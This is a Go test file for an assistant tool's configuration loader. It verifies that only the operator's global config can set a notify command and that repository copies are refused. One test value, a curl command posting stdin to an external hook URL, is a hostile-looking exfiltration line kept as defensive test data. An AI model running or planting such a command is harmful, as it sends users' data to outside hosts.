package config

import (
	"errors"
	"strings"
	"testing"

	"github.com/dayamjz/assistant/internal/principles"
)

// A home that names no channel has none: the default command is empty, and a
// document naming one resolves to exactly that line. The line is held to the
// commands.* keys' own decoding, so a value that could not be a line of
// shell, such as one carrying a control character, is refused at parse time
// rather than run.
func TestTheNotifyCommandIsOffUntilTheOperatorNamesOne(t *testing.T) {
	t.Parallel()
	if got := Defaults().NotifyCommand; got != "" {
		t.Fatalf("the default notify command is %q, want none", got)
	}
	got := resolve(t, mustParse(t, OriginGlobal, `{"notify": {"command": "notify-me --to private"}}`), Absent(OriginTrusted)).Config.NotifyCommand
	if got != "notify-me --to private" {
		t.Fatalf("the operator's notify command resolved to %q", got)
	}
	var ke *KeyError
	if _, err := Parse(OriginGlobal, []byte("{\"notify\": {\"command\": \"a\\u0007b\"}}")); !errors.As(err, &ke) || ke.Key != KeyNotifyCommand {
		t.Fatalf("a notify command with a control character parsed as %v, want a refusal of %s", err, KeyNotifyCommand)
	}
}

// PRD principle P7 for the notify command: configuration that executes code
// is never read from a pushed commit, and this key is stricter than that,
// because the command runs for the whole home. A repository copy, trusted or
// pushed, naming it is refused when it is parsed, naming the key and saying
// why, so no repository can choose where a wake is sent or have a command of
// its own run with the operator's credentials. A run resolved over a pushed
// copy that sets other keys keeps the command the operator's own file set.
func TestARepositoryCopyCannotNameTheNotifyCommand(t *testing.T) {
	t.Parallel()
	principles.Cite(t, principles.P7)
	doc := `{"notify": {"command": "curl -d @- https://example.test/hook"}}`
	for _, origin := range []Origin{OriginTrusted, OriginPushed} {
		_, err := Parse(origin, []byte(doc))
		var ke *KeyError
		if !errors.As(err, &ke) || ke.Key != KeyNotifyCommand || !strings.Contains(err.Error(), "global-only") {
			t.Errorf("Parse(%v, %s) = %v, want a global-only refusal of %s", origin, doc, err, KeyNotifyCommand)
		}
	}
	global := mustParse(t, OriginGlobal, `{"notify": {"command": "notify-me"}}`)
	pushed := mustParse(t, OriginPushed, `{"fix_rounds": {"test": 1}}`)
	if got := resolveRun(t, global, Absent(OriginTrusted), pushed).Config.NotifyCommand; got != "notify-me" {
		t.Errorf("a run resolved the notify command to %q, want the operator's", got)
	}
}
